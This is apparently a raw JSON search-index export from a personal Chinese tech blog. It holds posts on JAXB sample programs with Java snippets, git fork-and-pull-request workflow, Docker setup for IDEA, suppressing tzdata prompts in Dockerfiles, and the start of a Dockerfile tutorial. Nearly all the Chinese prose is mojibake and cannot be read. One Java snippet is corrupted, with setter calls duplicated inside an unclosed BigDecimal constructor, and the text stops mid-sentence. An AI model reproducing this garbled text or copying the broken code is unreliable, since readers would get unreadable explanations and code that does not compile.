è¡¨ï¼šä¸é€‚é…å™¨å…³è”çš„ JAXB æ³¨é‡Š JAXB Examples ä»¥ä¸‹éƒ¨åˆ†æè¿°äº†å¦‚ä½•ä½¿ç”¨ JAXB RI åŒ…ä¸­åŒ…å«çš„ç¤ºä¾‹åº”ç”¨ç¨‹åºã€‚JAXB RI åŒ…å¯ä» http://jaxb.java.net è·å¾—ã€‚ä¸‹è½½å¹¶å®‰è£… JAXB RI åŒ…ã€‚è¿™äº›ç¤ºä¾‹ä½äºjaxb-ri-install /samples/ç›®å½•ä¸­ã€‚è¿™äº›ç¤ºä¾‹æ¼”ç¤ºå¹¶å»ºç«‹åœ¨å…³é”®çš„ JAXB ç‰¹æ€§å’Œæ¦‚å¿µä¹‹ä¸Šã€‚æŒ‰ç…§æ˜¾ç¤ºçš„é¡ºåºæ‰§è¡Œè¿™äº›ç¨‹åºã€‚ é˜…è¯»å®Œæœ¬èŠ‚åï¼Œæ‚¨åº”è¯¥å¯¹ JAXB æ„Ÿåˆ°å¾ˆèˆ’æœï¼Œæ‚¨å¯ä»¥ï¼š ä» XML æ¨¡å¼ç”Ÿæˆ JAXB Java ç±» ä½¿ç”¨æ¨¡å¼æ´¾ç”Ÿçš„ JAXB ç±»æ¥è§£ç»„å’Œç¼–ç»„ Java åº”ç”¨ç¨‹åºä¸­çš„ XML å†…å®¹ ä½¿ç”¨æ´¾ç”Ÿæ¶æ„çš„ JAXB ç±»åˆ›å»º Java å†…å®¹æ ‘ åœ¨è§£ç»„å’Œè¿è¡Œæ—¶éªŒè¯ XML å†…å®¹ è‡ªå®šä¹‰ JAXB æ¨¡å¼åˆ° Java çš„ç»‘å®š æœ¬æ–‡æ¡£æè¿°äº†ä¸‰ç»„ç¤ºä¾‹ï¼š åŸºæœ¬ç¤ºä¾‹ï¼ˆModify Marshalã€Unmarshal Validateï¼‰æ¼”ç¤ºäº†åŸºæœ¬çš„ JAXB æ¦‚å¿µï¼Œä¾‹å¦‚ä½¿ç”¨é»˜è®¤è®¾ç½®å’Œç»‘å®šè§£ç»„ã€ç¼–ç»„å’ŒéªŒè¯ XML å†…å®¹ã€‚ è‡ªå®šä¹‰ç¤ºä¾‹ï¼ˆè‡ªå®šä¹‰å†…è”ã€æ•°æ®ç±»å‹è½¬æ¢å™¨ã€å¤–éƒ¨è‡ªå®šä¹‰ï¼‰æ¼”ç¤ºäº†è‡ªå®šä¹‰ XML æ¨¡å¼åˆ° Java å¯¹è±¡çš„é»˜è®¤ç»‘å®šçš„å„ç§æ–¹æ³•ã€‚ java-to-schema ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨æ³¨é‡Šå°† Java ç±»æ˜ å°„åˆ° XML æ¨¡å¼ã€‚ æ³¨æ„ï¼š åŸºæœ¬å’Œè‡ªå®šä¹‰ç¤ºä¾‹åŸºäºé‡‡è´­è®¢å•åœºæ™¯ã€‚æ¯ä¸ªéƒ½ä½¿ç”¨ä¸€ä¸ª XML æ–‡æ¡£po.xmlï¼Œå®ƒæ˜¯é’ˆå¯¹ XML æ¨¡å¼po.xsd ç¼–å†™çš„ã€‚è¿™äº›æ–‡æ¡£æ¥è‡ª W3C XML Schema Part 0: Primerï¼Œç”± David C. Fallside ç¼–è¾‘ã€‚ åŸºæœ¬å’Œè‡ªå®šä¹‰ç¤ºä¾‹ç›®å½•åŒ…å«å‡ ä¸ªåŸºæœ¬æ–‡ä»¶ï¼š po.xsdæ˜¯ XML æ¨¡å¼ï¼Œç”¨ä½œ JAXB ç»‘å®šç¼–è¯‘å™¨çš„è¾“å…¥ï¼Œå°†ä»æ¨¡å¼æ´¾ç”Ÿçš„ JAXB Java ç±»ç”Ÿæˆã€‚å¯¹äºè‡ªå®šä¹‰å†…è”å’Œæ•°æ®ç±»å‹è½¬æ¢å™¨ç¤ºä¾‹ï¼Œæ­¤æ–‡ä»¶åŒ…å«å†…è”ç»‘å®šè‡ªå®šä¹‰ã€‚ po.xmlæ˜¯åŒ…å«ç¤ºä¾‹ XML å†…å®¹çš„é‡‡è´­è®¢å• XML æ–‡ä»¶ï¼Œå®ƒæ˜¯æ¯ä¸ªç¤ºä¾‹ä¸­è§£ç»„åˆ° Java å†…å®¹æ ‘ä¸­çš„æ–‡ä»¶ã€‚è¯¥æ–‡ä»¶åœ¨æ¯ä¸ªç¤ºä¾‹ä¸­å‡ ä¹ç›¸åŒï¼›æœ‰ç»†å¾®çš„å†…å®¹å·®å¼‚æ¥çªå‡ºä¸åŒçš„ JAXB æ¦‚å¿µã€‚ Main.javaæ˜¯æ¯ä¸ªç¤ºä¾‹çš„ä¸»è¦ Java ç±»ã€‚ build.xmlæ˜¯ä¸€ä¸ªä¸ºæ‚¨æä¾›æ–¹ä¾¿çš„ Ant é¡¹ç›®æ–‡ä»¶ã€‚ä½¿ç”¨ Ant å·¥å…·è‡ªåŠ¨ç”Ÿæˆã€ç¼–è¯‘å’Œè¿è¡Œæ¨¡å¼æ´¾ç”Ÿçš„ JAXB ç±»ã€‚è¯¥çš„build.xmlæ–‡ä»¶è·¨è¶Šä¾‹å­å˜åŒ–ã€‚ inline-customizeç¤ºä¾‹ä¸­çš„MyDatatypeConverter.javaæ˜¯ä¸€ä¸ª Java ç±»ï¼Œç”¨äºæä¾›è‡ªå®šä¹‰æ•°æ®ç±»å‹è½¬æ¢ã€‚ å¤–éƒ¨å®šåˆ¶ç¤ºä¾‹ä¸­çš„binding.xjbæ˜¯ä¸€ä¸ªå¤–éƒ¨ç»‘å®šå£°æ˜æ–‡ä»¶ï¼Œå®ƒè¢«ä¼ é€’åˆ° JAXB ç»‘å®šç¼–è¯‘å™¨ä»¥å®šåˆ¶é»˜è®¤çš„ JAXB ç»‘å®šã€‚ ä¸‹è¡¨ç®€è¦æè¿°äº†åŸºæœ¬çš„ã€å®šåˆ¶çš„å’Œ java-to-schema JAXB ç¤ºä¾‹ã€‚ Example Name Description Modify Marshal æ¼”ç¤ºå¦‚ä½•ä¿®æ”¹Javaå†…å®¹æ ‘ã€‚ Unmarshal Validate æ¼”ç¤ºå¦‚ä½•åœ¨è§£ç»„æœŸé—´å¯ç”¨éªŒè¯ è¡¨:å®šåˆ¶JAXBç¤ºä¾‹ Example Name Description Customize Inline æ¼”ç¤ºå¦‚ä½•é€šè¿‡åœ¨ XML æ¨¡å¼ä¸­ä½¿ç”¨å†…è”æ³¨é‡Šæ¥è‡ªå®šä¹‰é»˜è®¤ JAXB ç»‘å®šã€‚ Datatype Converter è¯´æ˜ XML simpleTypeå®šä¹‰åˆ° Java æ•°æ®ç±»å‹çš„æ›¿ä»£ã€æ›´ç®€æ´çš„ç»‘å®šï¼Œç±»ä¼¼äºè‡ªå®šä¹‰å†…è”ç¤ºä¾‹ã€‚ External Customize è¯´æ˜å¦‚ä½•ä½¿ç”¨å¤–éƒ¨ç»‘å®šå£°æ˜æ–‡ä»¶å°†åªè¯»æ¨¡å¼çš„ç»‘å®šè‡ªå®šä¹‰ä¼ é€’ç»™ JAXB ç»‘å®šç¼–è¯‘å™¨ã€‚ è¡¨:javaåˆ°æ¨¡å¼çš„JAXBç¤ºä¾‹ Example Name Description Create Marshal æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ ObjectFactory ç±»åˆ›å»º Java å†…å®¹æ ‘å¹¶å°†å…¶ç¼–ç»„ä¸º XML æ•°æ®ã€‚å®ƒè¿˜æ¼”ç¤ºäº†å¦‚ä½•å‘ JAXB åˆ—è¡¨å±æ€§æ·»åŠ å†…å®¹ã€‚ XmlAccessorOrder è¯´æ˜å¦‚ä½•åœ¨ Java ç±»ä¸­ä½¿ç”¨@XmlAccessorOrderå’Œ@XmlType.propOrderæ˜ å°„æ³¨é‡Šæ¥æ§åˆ¶ Java ç±»å‹ç¼–ç»„æˆ–è§£ç»„ XML å†…å®¹çš„é¡ºåºã€‚ XmlAdapter è¯´æ˜å¦‚ä½•ä½¿ç”¨æ¥å£XmlAdapterå’Œæ³¨é‡Š@XmlJavaTypeAdapteræä¾› XML å†…å®¹è¿›å‡ºHashMapï¼ˆå­—æ®µï¼‰çš„è‡ªå®šä¹‰æ˜ å°„ï¼Œè¯¥å­—æ®µä½¿ç”¨æ•´æ•° ( int ) ä½œä¸ºé”®ï¼Œå°†å­—ç¬¦ä¸² ( String ) ä½œä¸ºå€¼ã€‚ XmlAttribute è¯´æ˜å¦‚ä½•ä½¿ç”¨æ³¨è§£@XmlAttributeå®šä¹‰è¦ä½œä¸º XML å±æ€§å¤„ç†çš„å±æ€§æˆ–å­—æ®µã€‚ XmlRootElement è¯´æ˜å¦‚ä½•ä½¿ç”¨æ³¨é‡Š@XmlRootElementä¸ºç›¸åº”ç±»çš„ XML æ¶æ„ç±»å‹å®šä¹‰ XML å…ƒç´ åç§°ã€‚ XmlSchemaType Class è¯´æ˜å¦‚ä½•ä½¿ç”¨æ³¨é‡Š@XmlSchemaTypeè‡ªå®šä¹‰å±æ€§æˆ–å­—æ®µåˆ° XML å†…ç½®ç±»å‹çš„æ˜ å°„ã€‚ XmlType è¯´æ˜å¦‚ä½•ä½¿ç”¨æ³¨é‡Š@XmlTypeå°†ç±»æˆ–æšä¸¾ç±»å‹æ˜ å°„åˆ° XML æ¶æ„ç±»å‹ã€‚ ä¸‹è¡¨æè¿°äº†åŸºæœ¬ç¤ºä¾‹çš„è¿™äº›ç±»åŠå…¶ä¸æºXMLæ¨¡å¼çš„ç‰¹å®šç»‘å®šã€‚ è¡¨:Schema-to-Javaç»‘å®š Schema-Derived JAXB Classes ä¸‹ä¸€èŠ‚å°†ç®€è¦è§£é‡ŠJAXBç»‘å®šç¼–è¯‘å™¨ä¸ºç¤ºä¾‹ç”Ÿæˆçš„ä»¥ä¸‹å„ä¸ªç±»çš„åŠŸèƒ½: [Items Class](#Items` Class) [ObjectFactory Class](#ObjectFactory` Class) [PurchaseOrderType Class](# Class) [USAddress Class](#USAddress` Class) Items Class In Items.java: è¯¥é¡¹ç›®ç±»æ˜¯éƒ¨åˆ† primer.poåŒ…ã€‚ è¯¥ç±»ä¸ºItems å’ŒItemTypeæä¾›å…¬å…±æ¥å£ã€‚ æ­¤ç±»å®ä¾‹åŒ–ä¸­çš„å†…å®¹ç»‘å®šåˆ° XML ComplexTypes ItemsåŠå…¶å­å…ƒç´  ItemTypeã€‚ Itemæä¾›äº†getItem()æ–¹æ³•ã€‚ ItemTypeæä¾›ä»¥ä¸‹æ–¹æ³•ï¼š getPartNum(); setPartNum(String value); getComment(); setComment(java.lang.String value); getUSPrice(); setUSPrice(java.math.BigDecimal value); getProductName(); setProductName(String value); getShipDate(); setShipDate(java.util.Calendar value); getQuantity(); setQuantity(java.math.BigInteger value); ObjectFactory Class In ObjectFactory.java: æ‰€è¿°çš„ObjectFactoryç±»æ˜¯éƒ¨åˆ†primer.poåŒ…ã€‚ ObjectFactoryæä¾›äº†å·¥å‚æ–¹æ³•ï¼Œç”¨äºåœ¨ Java å†…å®¹æ ‘ä¸­å®ä¾‹åŒ–è¡¨ç¤º XML å†…å®¹çš„ Java æ¥å£ã€‚ æ–¹æ³•åç§°æ˜¯é€šè¿‡è¿æ¥ç”Ÿæˆçš„ï¼š å­—ç¬¦ä¸²å¸¸é‡createã€‚ æ‰€æœ‰å¤–éƒ¨ Java ç±»åç§°ï¼Œå¦‚æœ Java å†…å®¹æ¥å£åµŒå¥—åœ¨å¦ä¸€ä¸ªæ¥å£ä¸­ã€‚ Java å†…å®¹æ¥å£çš„åç§°ã€‚ ä¾‹å¦‚ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯¹äº Java æ¥å£prime.po.Items.ItemTypeï¼ŒObjectFactoryåˆ›å»ºæ–¹æ³•createItemsItemType()ã€‚ PurchaseOrderType Class In PurchaseOrderType.java: æ‰€è¿°PurchaseOrderTypeç±»æ˜¯éƒ¨åˆ†primer.poåŒ…ã€‚ æ­¤ç±»å®ä¾‹åŒ–ä¸­çš„å†…å®¹ç»‘å®šåˆ°åä¸ºPurchaseOrderTypeçš„ XML æ¶æ„å­å…ƒç´ ã€‚ PurchaseOrderTypeæ˜¯ä¸€ä¸ªå…¬å…±æ¥å£ï¼Œæä¾›ä»¥ä¸‹æ–¹æ³•ï¼š getItems(); setItems(primer.po.Items value); getOrderDate(); setOrderDate(java.util.Calendar value); getComment(); setComment(java.lang.String value); getBillTo(); setBillTo(primer.po.USAddress value); getShipTo(); setShipTo(primer.po.USAddress value); USAddress Class In USAddress.java: çš„æ ¡èˆåœ°å€ç±»æ˜¯éƒ¨åˆ† primer.poåŒ…ã€‚ æ­¤ç±»å®ä¾‹åŒ–ä¸­çš„å†…å®¹ç»‘å®šåˆ°åä¸ºUSAddressçš„ XML æ¨¡å¼å…ƒç´ ã€‚ USAddressæ˜¯ä¸€ä¸ªå…¬å…±æ¥å£ï¼Œæä¾›ä»¥ä¸‹æ–¹æ³•ï¼š getState(); setState(String value); getZip(); setZip(java.math.BigDecimal value); getCountry(); setCountry(String value); getCity(); setCity(String value); getStreet(); setStreet(String value); getName(); setName(String value); åŸºæœ¬ç¤ºä¾‹ æœ¬èŠ‚ä»‹ç»äº†åŸºæœ¬ JAXB ç¤ºä¾‹ï¼ˆModify Marshalã€Unmarshal Validateï¼‰ï¼Œè¿™äº›ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•ï¼š å°† XML æ–‡æ¡£è§£ç»„ä¸º Java å†…å®¹æ ‘å¹¶è®¿é—®å…¶ä¸­åŒ…å«çš„æ•°æ® ä¿®æ”¹ Java å†…å®¹æ ‘ ä½¿ç”¨ObjectFactoryç±»åˆ›å»º Java å†…å®¹æ ‘ï¼Œç„¶åå°†å…¶ç¼–ç»„ä¸º XML æ•°æ® åœ¨è§£ç»„æœŸé—´æ‰§è¡ŒéªŒè¯ åœ¨è¿è¡Œæ—¶éªŒè¯ Java å†…å®¹æ ‘ Modify Marshal Example Modify Marshalç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•ä¿®æ”¹Javaå†…å®¹æ ‘ã€‚ è¯¥JAXBé‡Œå®‰è£…/samples/modify-marshal/src/Main.javaç±»å£°æ˜å¯¼å…¥ä¸‰ç§æ ‡å‡†çš„Javaç±»ï¼Œäº”JAXBç»‘å®šæ¡†æ¶ç±»å’Œçš„primer.poåŒ…ï¼š import java.io.FileInputStream; import java.io.IOException; import java.math.BigDecimal; import javax.xml.bind.JAXBContext; import javax.xml.bind.JAXBElement; import javax.xml.bind.JAXBException; import javax.xml.bind.Marshaller; import javax.xml.bind.Unmarshaller; import primer.po.*; åˆ›å»ºäº†ä¸€ä¸ªJAXBContextå®ä¾‹æ¥å¤„ç†åœ¨prime.po ä¸­ç”Ÿæˆçš„ç±» JAXBContext jc = JAXBContext.newInstance( \"primer.po\" ); åˆ›å»ºäº†ä¸€ä¸ªUnmarshallerå®ä¾‹ï¼Œå¹¶è§£ç»„äº†po.xmlæ–‡ä»¶ã€‚ Unmarshaller u = jc.createUnmarshaller(); PurchaseOrder po = (PurchaseOrder) u.unmarshal(new FileInputStream(\"po.xml\")); setæ–¹æ³•ç”¨äºä¿®æ”¹å†…å®¹æ ‘çš„åœ°å€åˆ†æ”¯ä¸­çš„ä¿¡æ¯ã€‚ USAddress address = po.getBillTo(); address.setName(\"John Bob\"); address.setStreet(\"242 Main Street\"); address.setCity(\"Beverly Hills\"); address.setState(\"CA\"); address.setZip(new BigDecimal address.setName(\"John Bob\"); address.setStreet(\"242 Main Street\"); address.setCity(\"Beverly Hills\"); address.setState(\"CA\"); address.setZip(new BigDecimal(\"90210\")); åˆ›å»ºäº†ä¸€ä¸ªMarshallerå®ä¾‹ï¼Œå¹¶å°†æ›´æ–°çš„ XML å†…å®¹ç¼–ç»„åˆ°system.outã€‚æ‰€è¿°çš„setProperty APIç”¨äºæŒ‡å®šè¾“å‡ºç¼–ç ; åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒæ˜¯æ ¼å¼åŒ–çš„ï¼ˆäººç±»å¯è¯»çš„ï¼‰XMLã€‚ Marshaller m = jc.createMarshaller(); m.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, Boolean.TRUE); m.marshal(po, System.out); Building and Running the Modify Marshal Example Using Ant è¦ä½¿ç”¨ Ant ç¼–è¯‘å’Œè¿è¡Œ Modify Marshal ç¤ºä¾‹ï¼Œè¯·åœ¨ç»ˆç«¯çª—å£ä¸­ï¼Œè½¬åˆ°jaxb-ri-install /samples/modify-marshal/ç›®å½•å¹¶é”®å…¥ä»¥ä¸‹å†…å®¹ï¼š ant Unmarshal Validate Example Unmarshal Validate ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•åœ¨è§£ç»„æœŸé—´å¯ç”¨éªŒè¯ã€‚è¯·æ³¨æ„ï¼ŒJAXB åœ¨è§£ç»„æœŸé—´æä¾›éªŒè¯åŠŸèƒ½ï¼Œä½†åœ¨ç¼–ç»„æœŸé—´ä¸æä¾›ã€‚éªŒè¯åœ¨æ›´å¤šå…³äºéªŒè¯ä¸­è¿›è¡Œäº†æ›´è¯¦ç»†çš„è§£é‡Š ã€‚ è¯¥JAXBé‡Œå®‰è£…/samples/unmarshal-validate/src/Main.javaç±»å£°æ˜ä¸ºä¸€ä¸ªæ ‡å‡†çš„Javaç±»ï¼ŒåJAXBç»‘å®šæ¡†æ¶ç±»å’Œè¿›å£primer.poåŒ…ï¼š import java.io.File; import javax.xml.bind.JAXBContext; import javax.xml.bind.JAXBException; import javax.xml.bind.Marshaller; import javax.xml.bind.UnmarshalException; import javax.xml.bind.Unmarshaller; import javax.xml.bind.ValidationEvent; import javax.xml.bind.ValidationEventHandler; import javax.xml.bind.ValidationEventLocator; import static javax.xml.XMLConstants.W3C_XML_SCHEMA_NS_URI; import javax.xml.validation.SchemaFactory; import javax.xml.validation.Schema; import primer.po.*; åˆ›å»ºäº†ä¸€ä¸ªJAXBContextå®ä¾‹æ¥å¤„ç†åœ¨prime.poåŒ…ä¸­ç”Ÿæˆçš„ç±»ã€‚ JAXBContext jc = JAXBContext.newInstance(\"primer.po\"); ä¸€ä¸ªUnmarshallerçš„å®ä¾‹è¢«åˆ›å»ºã€‚ Unmarshaller u = jc.createUnmarshaller(); é»˜è®¤çš„ JAXB Unmarshaller ``ValidationEventHandlerå·²å¯ç”¨ä»¥å‘system.outå‘é€éªŒè¯è­¦å‘Šå’Œé”™è¯¯ã€‚é»˜è®¤é…ç½®ä¼šå¯¼è‡´è§£ç»„æ“ä½œåœ¨é‡åˆ°ç¬¬ä¸€ä¸ªéªŒè¯é”™è¯¯æ—¶å¤±è´¥ã€‚ u.setValidating( true ); å°è¯•å°†po.xmlæ–‡ä»¶è§£ç»„ä¸º Java å†…å®¹æ ‘ã€‚å‡ºäºæœ¬ç¤ºä¾‹çš„ç›®çš„ï¼Œpo.xmlæ–‡ä»¶åŒ…å«æ•…æ„é”™è¯¯ PurchaseOrder po = (PurchaseOrder)u.unmarshal( new FileInputStream(\"po.xml\")); é»˜è®¤éªŒè¯äº‹ä»¶å¤„ç†ç¨‹åºå¤„ç†éªŒè¯é”™è¯¯ï¼Œç”Ÿæˆè¾“å‡ºåˆ°system.outï¼Œç„¶åæŠ›å‡ºå¼‚å¸¸. &#125; catch( UnmarshalException ue ) &#123; System.out.println(\"Caught UnmarshalException\");&#125; catch( JAXBException je ) &#123; je.printStackTrace();&#125; catch( IOException ioe ) &#123; ioe.printStackTrace();&#125; Building and Running the Unmarshal Validate Example Using Ant è¦ä½¿ç”¨ Ant ç¼–è¯‘å’Œè¿è¡Œ Unmarshal Validate ç¤ºä¾‹ï¼Œè¯·åœ¨ç»ˆç«¯çª—å£ä¸­ï¼Œè½¬åˆ°jaxb-ri-install /samples/unmarshal-validate/ç›®å½•å¹¶é”®å…¥ä»¥ä¸‹å†…å®¹ï¼š ant","categories":[{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/"},{"name":"JAXB","slug":"ç¬”è®°/JAXB","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/JAXB/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.sizaif.com/tags/Java/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/tags/%E7%AC%94%E8%AE%B0/"},{"name":"Xml","slug":"Xml","permalink":"https://www.sizaif.com/tags/Xml/"},{"name":"JAXB","slug":"JAXB","permalink":"https://www.sizaif.com/tags/JAXB/"}],"author":"sizaif"},{"title":"IDEA é…ç½®Docker æœ¬åœ°ç¯å¢ƒå¼€å‘Java","slug":"IDEA-é…ç½®docker-æœ¬åœ°ç¯å¢ƒå¼€å‘java","date":"2021-08-10T05:50:35.000Z","updated":"2021-09-19T10:14:55.524Z","comments":true,"path":"posts/8904d55a/","link":"","permalink":"https://www.sizaif.com/posts/8904d55a/","excerpt":"","text":"IDEA é…ç½®docker æœ¬åœ°ç¯å¢ƒå¼€å‘java ğŸ˜„ @by sizaif ğŸ“† 2021-05-17 22:52:02 [TOC] è¯´æ˜ åˆæ­¥çš„æ€è·¯æ˜¯: åœ¨windowså¹³å°ä¸‹ ä½¿ç”¨ideaè°ƒè¯•ä»£ç , é€šè¿‡ docker é…ç½®è¿è¡Œlinuxç¯å¢ƒ, è¿æ¥åˆ°docker å®¹å™¨ä¸­, åœ¨dockerå®¹å™¨ä¸­è¿è¡Œä»£ç  å®‰è£…dockeræ’ä»¶ docker-winwdos å¼€å¯tcpè¿œç¨‹è¿æ¥ ideaä¸­é…ç½®dockerç¯å¢ƒ ideaé…ç½®è¿è¡Œç¯å¢ƒ æœªå®Œå¾…ç»­","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Docker","slug":"æŠ€æœ¯å‘/Docker","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Docker/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.sizaif.com/tags/Java/"},{"name":"Docker","slug":"Docker","permalink":"https://www.sizaif.com/tags/Docker/"},{"name":"IDEA","slug":"IDEA","permalink":"https://www.sizaif.com/tags/IDEA/"}],"author":"sizaif"},{"title":"Git å¤šäººåä½œ & è´¡çŒ®","slug":"git-å¤šäººåä½œ-è´¡çŒ®","date":"2021-08-10T05:44:06.000Z","updated":"2021-09-19T10:15:01.624Z","comments":true,"path":"posts/8ea2fec1/","link":"","permalink":"https://www.sizaif.com/posts/8ea2fec1/","excerpt":"","text":"git å¤šäººåä½œ &amp; è´¡çŒ® ğŸ˜„ @Auther by sizaif ğŸ“† 2021-06-24 17:03:01 [TOC] ä¿®è®¢å†å² 2021-06-24 17:04:08: é¦–æ¬¡ç¼–è¾‘ 2021-06-25 10:23:09: æ·»åŠ pull requestå›¾ç‰‡ æ•´ä½“æµç¨‹ é¦–å…ˆforkåˆ«äººçš„é¡¹ç›®åˆ°åœ¨è‡ªå·±çš„githubä»“åº“ä¸­,ç„¶åæ‹‰å–é¡¹ç›®åˆ°æœ¬åœ°å¼€å‘,å¼€å‘å®ŒæˆååšPull Request åˆ«äººé¡¹ç›®(ä¸»ä»“): upstream/master è‡ªå·±è¿œç¨‹ä»“åº“: origin/master æœ¬åœ°ä»“åº“: local/master ä¿æŒä½ çš„ä»“åº“å’ŒåŸä½œè€…çš„ä»“åº“ä¸€è‡´ ä¸€æ˜¯åœ¨githubé¡¹ç›®ä¸­ç‚¹å‡»: äºŒæ˜¯é€šè¿‡gitå‘½ä»¤å®ç° child:codeblock open:false color:green #æŸ¥çœ‹æœ¬åœ°è¿œç¨‹ä»“åº“ä¿¡æ¯ $ git remote -v #æ·»åŠ ä¸»ä»“åˆ°æœ¬åœ°ä»“,å¹¶å‘½ä¸ºupstream,( è¿™ä¸ªä»“åº“ä¿æŒæœ€æ–°ä¸åŸä½œè€…çš„masterä¸€è‡´) $ git remote add upstream åŸä½œè€…çš„é¡¹ç›®.git #å†æ¬¡æŸ¥çœ‹æœ¬åœ°è¿œç¨‹ä»“åº“ä¿¡æ¯,æ­¤æ—¶ upstream æ˜¾ç¤ºä¸ºåŸä½œè€…çš„é¡¹ç›®åœ°å€ $ git remote-v #å°†ä¸»ä»“fetchåˆ°æœ¬åœ°å’Œæœ¬åœ°masteråˆå¹¶ $ git pull upstream master # å°†æœ¬åœ°master pushåˆ° ä½ çš„è¿œç¨‹ä»“åº“å®ç°æœ€æ–° $ git push Pull Request å½“æœ¬åœ°å¼€å‘å®Œ,æƒ³pull ç»™ä½œè€…è´¡çŒ®æ—¶, ç”¨åˆ°pull request åœ¨æ¥ä¸‹æ¥çš„ç•Œé¢ä¸­,æ·»åŠ ä¸€ä¸‹ä½ çš„ä¸»è¦å·¥ä½œå†…å®¹,è®©åŸä½œè€…å¯ä»¥æ¸…æ™°çš„ç†è§£ä½ çš„æ–°getç‚¹, æäº¤åç­‰å¾…å³å¯. ä¹Ÿå¯ä»¥ç›´æ¥åœ¨jetbrainså®¶ idea,pycharmç­‰è½¯ä»¶é‡Œç›´æ¥æäº¤","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Git","slug":"æŠ€æœ¯å‘/Git","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.sizaif.com/tags/Git/"}],"author":"sizaif"},{"title":"Dockerfileæ„å»ºdockeræ—¶apt-Get Installé‡åˆ°äº¤äº’å¼å¤„ç†æ–¹æ³•","slug":"Dockerfileæ„å»ºdockeræ—¶apt-get-installé‡åˆ°äº¤äº’å¼å¤„ç†æ–¹æ³•","date":"2021-08-10T05:38:52.000Z","updated":"2021-09-19T10:15:07.127Z","comments":true,"path":"posts/37be8a52/","link":"","permalink":"https://www.sizaif.com/posts/37be8a52/","excerpt":"","text":"Dockerfileæ„å»ºdockeræ—¶apt-get installé‡åˆ°äº¤äº’å¼å¤„ç†æ–¹æ³• ğŸ˜„ @auther by sizaif ğŸ“†2021-07-01 02:20:43 [TOC] ç¼–è¾‘å†å² 2021-07-01 02:21:01: ç¬¬ä¸€æ¬¡ç¼–è¾‘ é—®é¢˜è¯´æ˜ å½“ä½¿ç”¨Dockerfileæ„å»ºdockeræ—¶,æ‰§è¡Œå‘½ä»¤apt-get install -y build-essential æ—¶,ä¼šå®‰è£…tzdata, ä½†ä»tzdata 2018ç‰ˆæœ¬å¼€å§‹ï¼ˆå¦‚2018dï¼‰ï¼Œå®‰è£…è¿‡ç¨‹ä¸­é»˜è®¤é‡‡ç”¨äº¤äº’å¼ï¼Œå³è¦æ±‚è¾“å…¥æŒ‡å®šçš„Geographic areaå’ŒTime zoneï¼Œä»è€Œå¿…é¡»äººå·¥å€¼å®ˆè¿›è¡Œå®‰è£…ï¼Œè¾“å‡ºä¿¡æ¯å¦‚ä¸‹ã€‚ è€ŒDockerfileæ„å»ºè¿‡ç¨‹ä¸­,æ— æ³•è¿›è¡Œäº¤äº’. è§£å†³æ–¹æ³• åœ¨ apt-get install -y å‘½ä»¤å‰ æ·»åŠ  DEBIAN_FRONTEND=noninteractive å³: RUN DEBIAN_FRONTEND=noninteractive apt-get install -y &lt;software name> æ³¨: DEBIAN_FRONTEND=noninteractive åŒæ ·é€‚ç”¨äºshell è„šæœ¬","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Docker","slug":"æŠ€æœ¯å‘/Docker","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Docker/"}],"tags":[{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://www.sizaif.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/tags/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Docker","slug":"Docker","permalink":"https://www.sizaif.com/tags/Docker/"}],"author":"sizaif"},{"title":"Dockerfile Tutorial","slug":"Dockerfile-Tutorial","date":"2021-08-10T05:17:22.000Z","updated":"2021-09-19T10:15:10.993Z","comments":true,"path":"posts/f8a23a09/","link":"","permalink":"https://www.sizaif.com/posts/f8a23a09/","excerpt":"","text":"Dockerfile Tutorial ğŸ˜„ @Auther: sizaif ğŸ“†2021-06-08 15:30:38 [TOC] Dockerfile æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶å†…åŒ…å«äº†ä¸€æ¡æ¡çš„ æŒ‡ä»¤(Instruction)ï¼Œæ¯ä¸€æ¡æŒ‡ä»¤æ„å»ºä¸€å±‚ï¼Œå› æ­¤æ¯ä¸€æ¡æŒ‡ä»¤çš„å†…å®¹ï¼Œå°±æ˜¯æè¿°è¯¥å±‚åº”å½“å¦‚ä½•æ„å»ºã€‚ è¿˜ä»¥ä¹‹å‰å®šåˆ¶ nginx é•œåƒä¸ºä¾‹ï¼Œè¿™æ¬¡æˆ‘ä»¬ä½¿ç”¨ Dockerfile æ¥å®šåˆ¶ã€‚ åœ¨ä¸€ä¸ªç©ºç™½ç›®å½•ä¸­ï¼Œå»ºç«‹ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå¹¶å‘½åä¸º 